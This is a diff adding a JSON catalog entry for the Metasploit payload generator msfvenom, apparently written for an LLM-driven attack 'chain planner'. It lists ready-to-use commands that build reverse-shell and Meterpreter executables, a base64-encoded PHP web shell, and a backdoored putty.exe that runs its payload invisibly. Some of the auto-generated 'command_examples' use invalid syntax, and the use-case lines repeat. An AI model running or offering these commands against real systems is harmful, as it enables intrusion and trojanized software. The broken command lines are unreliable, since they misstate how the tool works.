@@ -1,0 +1,212 @@
+{
+  "id": "kali:msfvenom",
+  "kind": "kali_command_detailed_usage",
+  "name": "msfvenom",
+  "title": "Metasploit Payload Generator",
+  "description": "A standalone command-line utility within the Metasploit Framework used to generate, encode, and output payloads. It combines the older separate features of 'msfpayload' and 'msfencode' into a unified syntax, supporting various executable, script, and raw shellcode formats, encoding systems, and template injection.",
+  "what_for": [
+    "Generating raw shellcode in scripting formats (C, Python, Perl, Ruby, PowerShell) for manual exploit development.",
+    "Compiling payload shellcode into ready-to-run executables (.exe, .elf, .macho, .apk) for different target operating systems.",
+    "Encoding payloads using custom encoders (e.g. 'x86/shikata_ga_nai' or 'php/base64') to avoid bad characters and evade legacy antivirus systems.",
+    "Injecting malicious shellcode into legitimate template binaries to evade detection while preserving original program behavior."
+  ],
+  "cli_arguments": [
+    {
+      "flags": [
+        "-p",
+        "--payload <payload_path>"
+      ],
+      "description": "Specify the Metasploit payload to generate (e.g., 'windows/meterpreter/reverse_tcp')."
+    },
+    {
+      "flags": [
+        "-l",
+        "--list <type>"
+      ],
+      "description": "List modules of a specific type. Choices: payloads, encoders, nops, platforms, archs, formats, all."
+    },
+    {
+      "flags": [
+        "-f",
+        "--format <format_name>"
+      ],
+      "description": "Define the output file format. Executables (exe, elf, macho, apk, war, jsp) or scripting variables (c, py, rb, php, powershell, raw)."
+    },
+    {
+      "flags": [
+        "-o",
+        "--out <file_path>"
+      ],
+      "description": "Save the generated payload binary or script directly to the specified file."
+    },
+    {
+      "flags": [
+        "-e",
+        "--encoder <encoder_name>"
+      ],
+      "description": "Specify the encoder to apply to the payload shellcode (e.g. 'x86/shikata_ga_nai' or 'php/base64')."
+    },
+    {
+      "flags": [
+        "-i",
+        "--iterations <count>"
+      ],
+      "description": "Specify the number of times to run the encoder over the payload (more iterations increase obfuscation but grow the size)."
+    },
+    {
+      "flags": [
+        "-b",
+        "--bad-chars <string>"
+      ],
+      "description": "A list of bytes to avoid in the generated shellcode (e.g., '\\x00\\x0a\\x0d' to avoid null bytes and carriage returns in string overflows)."
+    },
+    {
+      "flags": [
+        "-x",
+        "--template <file_path>"
+      ],
+      "description": "Specify a legitimate executable to use as a template (payload will be injected/merged into this file)."
+    },
+    {
+      "flags": [
+        "-k",
+        "--keep"
+      ],
+      "description": "Used with '--template'. Configures the payload to execute in a new thread, keeping the original template program running normally."
+    },
+    {
+      "flags": [
+        "-a",
+        "--arch <architecture>"
+      ],
+      "description": "Specify the processor architecture of the target (e.g., x86, x64, armle, mips)."
+    },
+    {
+      "flags": [
+        "--platform <platform_name>"
+      ],
+      "description": "Specify the platform/OS of the target (e.g., windows, linux, android, osx, php, solaris)."
+    }
+  ],
+  "common_payloads": [
+    {
+      "payload": "windows/x64/meterpreter/reverse_tcp",
+      "description": "Windows 64-bit interactive Meterpreter shell over an outgoing TCP connection."
+    },
+    {
+      "payload": "linux/x64/shell_reverse_tcp",
+      "description": "Linux 64-bit standard command shell (/bin/sh) over an outgoing TCP connection."
+    },
+    {
+      "payload": "php/meterpreter/reverse_tcp",
+      "description": "PHP web-based Meterpreter reverse TCP connection (for vulnerable web servers)."
+    },
+    {
+      "payload": "android/meterpreter/reverse_tcp",
+      "description": "Android package payload containing a reverse TCP Meterpreter session."
+    }
+  ],
+  "common_formats": {
+    "executable": [
+      "exe",
+      "elf",
+      "macho",
+      "apk",
+      "war",
+      "vba",
+      "vbs"
+    ],
+    "script": [
+      "py",
+      "pl",
+      "rb",
+      "php",
+      "asp",
+      "aspx",
+      "jsp"
+    ],
+    "raw_shellcode": [
+      "c",
+      "num",
+      "raw",
+      "sh",
+      "powershell",
+      "js_be"
+    ]
+  },
+  "examples": [
+    {
+      "description": "Generating a standard Windows 64-bit reverse TCP Meterpreter executable",
+      "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f exe -o payload.exe"
+    },
+    {
+      "description": "Generating a Linux 64-bit ELF reverse command shell binary",
+      "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f elf -o shell.elf"
+    },
+    {
+      "description": "Generating a base64-encoded raw PHP web shell payload",
+      "command": "msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e php/base64 -f raw -o shell.php"
+    },
+    {
+      "description": "Injecting a reverse TCP Meterpreter payload into PuTTY (legitimate executable) to run invisibly in a separate thread",
+      "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -x putty.exe -k -f exe -o putty_infected.exe"
+    },
+    {
+      "description": "Generating C-style x86 Windows shellcode excluding null bytes",
+      "command": "msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -b \"\\x00\" -f c"
+    }
+  ],
+  "risk": {
+    "level": "critical",
+    "signals": [
+      "offensive_tool",
+      "intrinsic",
+      "remote_possible",
+      "polymorphic_compatible",
+      "target_adaptive_compatible"
+    ],
+    "requires_explicit_authorization": true,
+    "allow_autonomous_execution": false,
+    "warning": "Malware and exploit payload generation tools like msfvenom must be used exclusively in controlled security evaluation labs. Building payloads targeting unauthorized networks is illegal. Local antivirus software may flag payload files immediately upon creation."
+  },
+  "tags": [
+    "offensive",
+    "msfvenom",
+    "web",
+    "kfiosa",
+    "indexed",
+    "polymorphic",
+    "target-adaptive"
+  ],
+  "use_cases": [
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Indexing only — no automated invocation. The operator must manually inspect the repository before adding to a toolchain.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Pair with the LLM system-prompt stanza to ensure the chain planner knows how to call this tool."
+  ],
+  "command_examples": [
+    "cd toolboxes/msfvenom && python3 msfvenom.py --target $KFIOSA_TARGET_HOST",
+    "cd toolboxes/msfvenom && python3 msfvenom.py --help",
+    "cd toolboxes/msfvenom && python3 msfvenom.py --help",
+    "cd toolboxes/msfvenom && python3 msfvenom.py --help",
+    "cd toolboxes/msfvenom && python3 msfvenom.py --help",
+    "KFIOSA_TARGET_HOST=$KFIOSA_TARGET_HOST msfvenom --output $KFIOSA_OUTPUT_DIR/msfvenom.log",
+    "KFIOSA_TARGET_HOST=$KFIOSA_TARGET_HOST msfvenom --output $KFIOSA_OUTPUT_DIR/msfvenom.log"
+  ],
+  "attack_surface": [
+    "web"
+  ],
+  "phase_hint": "any",
+  "requires_hardware": [
+    "none"
+  ],
+  "polymorphic_strategies": [
+    "param_grammar"
+  ],
+  "target_adaptive_targets": [
+    "target_class"
+  ],
+  "_kfiosa_enriched_schema": "1.1.0"
+}
